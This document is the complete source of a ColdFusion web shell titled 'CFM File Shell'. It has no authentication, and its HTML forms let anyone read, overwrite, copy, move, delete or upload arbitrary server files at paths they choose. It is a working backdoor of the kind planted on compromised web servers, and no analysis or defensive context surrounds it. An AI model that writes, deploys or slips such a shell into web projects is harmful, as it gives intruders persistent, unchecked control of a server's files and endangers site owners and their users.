<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>CFM File Shell</title>
</head>
<body>

<CFPARAM NAME="Form.Action" DEFAULT="ShowPost">
<CFSWITCH EXPRESSION=#Form.Action#>

<CFCASE VALUE="read">
<CFFILE ACTION="Read" FILE="#Form.path#" VARIABLE="Message">
<CFOUTPUT>#htmlCodeFormat(Message)#</CFOUTPUT>
</CFCASE>

<CFCASE VALUE="write">
<CFFILE ACTION="Write" FILE="#Form.path#" OUTPUT="#Form.cmd#">
Write Successed!!
</CFCASE>

<CFCASE VALUE="copy">
<CFFILE ACTION="Copy" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
Copy Successed!!
</CFCASE>

<CFCASE VALUE="move">
<CFFILE ACTION="MOVE" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
Move Successed!!
</CFCASE>

<CFCASE VALUE="delete">
<CFFILE ACTION="Delete" FILE="#Form.path#">
Delete Successed!!
</CFCASE>


<CFCASE VALUE="upload">
<CFFILE ACTION="UPLOAD" FILEFIELD="FileContents" DESTINATION="#Form.path#" NAMECONFLICT="OVERWRITE">
Upload Successed!!
</CFCASE>

<CFDEFAULTCASE>

<form action="" target="_blank" method=post>
<textarea style="width:600;height:200" name="cmd"></textarea><br>
<input name="path" value="<cfoutput>#CGI.PATH_TRANSLATED#</cfoutput>" size=72>
<input type=submit value="Write">
<input type=hidden name="action" value="write">
</form>
<br>

<form action="" target="_blank" method=post>
<input name="path" value="<cfoutput>#CGI.PATH_TRANSLATED#</cfoutput>" size=72>
<input type=submit value="Read">
<input type=hidden name="action" value="read">
</form>
<br>

<FORM ACTION="" ENCTYPE="multipart/form-data" METHOD="Post" target="_blank">
Upload Path: <INPUT NAME="path" value="<cfoutput>#CGI.PATH_TRANSLATED#</cfoutput>" size=72><br>
File: <INPUT NAME="FileContents" TYPE="file" size=50>
<input type=hidden name="action" value="upload">
<INPUT TYPE="submit" VALUE="Upload">
</FORM>

<br>

<form action="" target="_blank" method=post>
Source ??<input name="Source" value="<cfoutput>#CGI.PATH_TRANSLATED#</cfoutput>" size=65><br>
Destination ??<input name="Destination" value="<cfoutput>#CGI.PATH_TRANSLATED#</cfoutput>" size=65>
<input type=submit value="Copy File">
<input type=hidden name="action" value="copy">
</form>

<br>

<form action="" target="_blank" method=post>
Source file:<input name="Source" value="<cfoutput>#CGI.PATH_TRANSLATED#</cfoutput>" size=65><br>
Destionation to:<input name="Destination" value="<cfoutput>#CGI.PATH_TRANSLATED#</cfoutput>" size=65>
<input type=submit value="Move file">
<input type=hidden name="action" value="move">
</form>

<br>

<form action="" target="_blank" method=post>
<input name="path" value="<cfoutput>#CGI.PATH_TRANSLATED#</cfoutput>" size=72>
<input type=submit value="Del file">
<input type=hidden name="action" value="delete">
</form>

</CFDEFAULTCASE>
</CFSWITCH>
</body>
</html>
